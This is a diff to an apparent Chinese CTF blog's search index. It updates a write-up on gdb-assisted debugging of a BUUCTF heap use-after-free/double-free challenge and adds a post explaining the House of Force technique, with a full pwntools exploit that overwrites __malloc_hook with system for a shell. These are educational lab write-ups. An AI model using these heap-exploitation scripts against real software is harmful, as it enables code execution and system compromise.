@@ -10,14 +10,14 @@
 <p>希望可以一直进步下去！！！</p>
 <p>新学会了用python交互模式进行gdb的单步调试</p>
 <p>下面以一个简单的uaf堆题为例：</p>
-<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="/gdb%5Cgdb1.png" alt="gdb1"></p>
-<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="/image-20251112145102620.png" alt="image-20251112145102620"></p>
-<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="/gdb2.png" alt="gdb2"></p>
-<p><img src="/image-20251112145421701.png" alt="image-20251112145421701"></p>
+<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb1.png" alt="gdb1"></p>
+<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145102620.png" alt="image-20251112145102620"></p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb2.png" alt="gdb2"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145421701.png" alt="image-20251112145421701"></p>
 <p>这里可以看到data段的全局变量<strong>602090</strong>初始的时候是<strong>1</strong></p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="/image-20251112145252356.png" alt="image-20251112145252356"></p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145252356.png" alt="image-20251112145252356"></p>
 <p>这里存在一个 **uaf **漏洞。</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="/image-20251112145305907.png" alt="image-20251112145305907"></p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145305907.png" alt="image-20251112145305907"></p>
 <h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这里的思路就是利<u>doublefree</u>或者 <u>uaf</u> 将 全局变量<strong>602090</strong>变为0</p>
 <h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 环境配置</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># 目标地址（如 GOT 表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;申请堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;填充堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发漏洞函数&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit 流程</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 申请两个 0x50 大小的堆块（0x40 + header）</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 构造 Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 释放 chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># 释放 chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 再次释放 chunk 0，形成 fastbin 链表：0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 控制 fastbin 链表头</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># 指向目标地址 - 0x10（chunk header）</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 重新分配，控制目标地址附近的内存</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 0 位置</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 1 位置，此时其 fd 指向 target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到 target-0x10 附近，可以覆盖目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 覆盖目标内容（如 GOT 表项）</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># 或者 system(&quot;/bin/sh&quot;) 的地址</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 触发漏洞</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -26,55 +26,54 @@
 <h2 id="动态调试part1："><a href="#动态调试part1：" class="headerlink" title="动态调试part1："></a><strong>动态调试part1</strong>：</h2><ul>
 <li>首先开启一个<strong>python3</strong> 解释器:</li>
 </ul>
-<p><img src="/image-20251112150609622.png" alt="image-20251112150609622"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112150609622.png" alt="image-20251112150609622"></p>
 <p>这里同时也可以看到我们启动了一个进程72687</p>
 <ul>
 <li>同时开启另一个<strong>gdb</strong>终端：</li>
 </ul>
-<p><img src="/image-20251112151018331.png" alt="image-20251112151018331"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112151018331.png" alt="image-20251112151018331"></p>
 <p><code>attach (pid)</code>在gdb里面附件进程。</p>
 <ul>
 <li>设置关键断点：</li>
 </ul>
-<p><img src="/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
-<p><img src="/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
-<p><img src="/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
 <p>在三个关键函数的返回处设置断点</p>
-<p><img src="/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
 <p>然后continue等待解释器输入</p>
-<p><img src="/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
 <ul>
 <li>开始进行单步调试：</li>
 </ul>
-<p><img src="/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
 <p>这里定义函数</p>
 <p>然后下面我们执行了<code>alloc(0x40)</code>创建了0x40大小的堆块</p>
-<p><img src="/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
 <p>这里可以看到右边的终端停在了我们设置的断点</p>
-<p><img src="/image-20251112153558163.png" alt="image-20251112153558163"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153558163.png" alt="image-20251112153558163"></p>
 <p>这里也可以看到我们的堆块创建成功。</p>
 <p>这样调试可以看到每步的执行情况。</p>
 <p>每次进入<code>Continuing.</code>等待执行时候在python解释器执行新的指令</p>
-<p><img src="/image-20251112153909048.png" alt="image-20251112153909048"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153909048.png" alt="image-20251112153909048"></p>
 <p>这里看到成功把<code>chunk0</code>的<code>fd</code>改为<code>全局变量-0x10</code>,然后后面通过edit就可以修改这个伪造的堆块，也就是我们需要利用全局变量</p>
-<p><img src="/image-20251112154622804.png" alt="image-20251112154622804"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112154622804.png" alt="image-20251112154622804"></p>
 <p>查看全局变量<code>buf</code></p>
 <p>可以看到我们的目标地址被当作了一个堆块。后面就修改堆块3即可。</p>
-<p><img src="/image-20251112155101849.png" alt="image-20251112155101849"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155101849.png" alt="image-20251112155101849"></p>
 <p>这里可以看到我们成功启动了shell的进程：</p>
-<p><img src="/image-20251112155456001.png" alt="image-20251112155456001"></p>
-<p><img src="/image-20251112155433697.png" alt="image-20251112155433697"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155456001.png" alt="image-20251112155456001"><img src="/image-20251112155433697.png" alt="image-20251112155433697"></p>
 <p><strong>注意</strong>：</p>
 <p><code>ctrl + d </code>退出python解释器</p>
 <p>想看执行情况可以随时<code>ctrl + c</code>暂停gdb终端</p>
-<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="/image-20251112162347772.png" alt="image-20251112162347772"></p>
+<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162347772.png" alt="image-20251112162347772"></p>
 <p>这里可以看到我们进入了<code>interactive mode</code></p>
-<p><img src="/image-20251112162428445.png" alt="image-20251112162428445"></p>
-<p><img src="/image-20251112162453383.png" alt="image-20251112162453383"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162428445.png" alt="image-20251112162428445"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162453383.png" alt="image-20251112162453383"></p>
 <p>继续4执行<code>shell()</code>成功</p>
 <p>同时可以利用<code>interactive mode</code>和<code>gdb.attach()</code></p>
-<p><img src="/image-20251112162721541.png" alt="image-20251112162721541"></p>
-<p><img src="/image-20251112162730716.png" alt="image-20251112162730716"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162721541.png" alt="image-20251112162721541"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162730716.png" alt="image-20251112162730716"></p>
 <p>这里就是说当写脚本的时候可以利用<code>interactive mode</code> 继续往下执行<code>gdb.attach</code>后面的内容。</p>
 ]]></content>
       <categories>
@@ -328,6 +327,76 @@
 ]]></content>
       <tags>
         <tag>CSAPP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>House of force</title>
+    <url>/2025/11/28/House%20of%20force/</url>
+    <content><![CDATA[<h1 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol>
+<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
+<li>能够自由地控制堆分配尺寸的大小</li>
+</ol>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><strong>利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。</strong></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line"><span class="comment">//nb是用户申请的堆块的大小加上头堆块 </span></span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    <span class="comment">// 新的top chunk的大小</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb)；</span><br><span class="line">    <span class="comment">//等价于remainder = (mchunkptr)((char*)victim + nb); 获取新的top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    <span class="comment">//更新top chunk地址</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>只要满足把top chunk的size改成一个很大的值，就可以通过这个检测。</p>
+<p>一般把top chunk size的值改为-1 size是unsigned int类型就会变成0xffffffffffffffff  从而绕过检测。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(offset);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的offset就是想控制top chunk移动后的位置。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = target - <span class="number">0x10</span> <span class="comment">//nb</span></span><br><span class="line">       -=top </span><br><span class="line">    </span><br><span class="line"><span class="built_in">malloc</span>(offset) <span class="comment">// 此时new top chunk的头地址就会位于 target-0x10的位置</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>) <span class="comment">//实现任意地址写    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里<code>offset</code>也可以是负数 （控制<code>topchunk</code>向低地址偏移）</p>
+<ul>
+<li><p>由于我们的<code>top chunk size</code>是-1 所以可以绕过检测。</p>
+</li>
+<li><p><code>new top chunk</code>的size我们不需要关系 重要的是<code>new top chunk</code>的地址 ,也就是：</p>
+<p><code>remainder = chunk_at_offset(victim, nb):</code></p>
+<p>这里我们的nb是一个负数  虽然转化成unsigned int类型会变成一个很大的正数 但是计算的时候会经过处理变成正常的加减法 就把他当成正常负数看就好。</p>
+</li>
+</ul>
+<h2 id="例题：2023-羊城杯决赛easy-force"><a href="#例题：2023-羊城杯决赛easy-force" class="headerlink" title="例题：2023 羊城杯决赛easy_force"></a>例题：2023 羊城杯决赛easy_force</h2><h3 id="main："><a href="#main：" class="headerlink" title="main："></a><strong>main：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png" alt="image-20251127122736424"></p>
+<h3 id="add"><a href="#add" class="headerlink" title="add:"></a><strong>add:</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png" alt="image-20251127122801609"></p>
+<h3 id="保护："><a href="#保护：" class="headerlink" title="保护："></a><strong>保护：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png" alt="image-20251127123220721"></p>
+<p>这里只给了4次add函数的机会 ， 其他的函数都无用。</p>
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><p>通过house of force 把 malloc_hook 改成 system(\bin\sh)。</p>
+<h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h3><h4 id="首先通过mmap泄露libc基地址："><a href="#首先通过mmap泄露libc基地址：" class="headerlink" title="首先通过mmap泄露libc基地址："></a>首先通过<code>mmap</code>泄露<code>libc</code>基地址：</h4><p>在处理大 chunk 时的行为：<br>glibc 的 <code>malloc</code> 对于大于<code> mmap_threshold</code> 的申请，不使用 heap，而是直接调用 mmap() 向内核申请一块内存。<br>默认情况下，这个阈值在 128 KB 左右（也可能是更大）<br>(比如：<code>malloc(0x20000)</code> ➜ 会使用 <code>mmap</code>)</p>
+<p><code>mmap </code>分配的大 <code>chunk</code> 地址规律：</p>
+<p>使用<code>mmap()</code>分配的内存块，一般在 libc 映射地址之下；<br>在默认的内存布局中，<code>mmap()</code> 返回的地址和 libc.so 的加载基址存在一个固定偏移；</p>
+<p>申请一个超大 chunk（触发 <code>mmap</code>）<br>打印这个 chunk 的地址<br>减去偏移,得到 libc base</p>
+<p>这个偏移值是固定的（取决于特定 libc 版本的布局），你只要知道 libc 版本，就可以知道偏移量。</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libc.address= <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png" alt="Image #1"></p>
+<h4 id="修改topchunk-size"><a href="#修改topchunk-size" class="headerlink" title="修改topchunk  size:"></a>修改<code>topchunk</code>  size:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png" alt="image-20251127125636159"></p>
+<h4 id="计算偏移移动top-chunk到新位置"><a href="#计算偏移移动top-chunk到新位置" class="headerlink" title="计算偏移移动top chunk到新位置:"></a>计算偏移移动<code>top chunk</code>到新位置:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">// <span class="number">0x20</span>的偏移通过调试获得</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png" alt="image-20251127125941799"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png" alt="image-20251127125952099"></p>
+<p>这里可以看到new top 被移动到了malloc_hook - 0x10的位置。</p>
+<p>这样我们就可以进行任意地址写 覆写malloc_hook的地址了</p>
+<h4 id="写入system："><a href="#写入system：" class="headerlink" title="写入system："></a>写入system：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到<code>new topchunk</code> 切割了一块0x20大小的堆块给返回给用户</p>
+<p>我们从这里写入了system的地址</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png" alt="image-20251127130158802"></p>
+<p>后面再次利用malloc函数就可以实现打通。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;now what to write?\n&quot;</span>,content)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libcc = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc.address= libcc +<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libcc))</span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system :&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>house of force 的关键在于可以修改<code>topchunk</code>的size部分 以及 计算好到target目标地址的偏移量。</p>
+<p>参考：<a href="https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/index.html">https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem(&#39;bin%20sh&#39;))/index.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
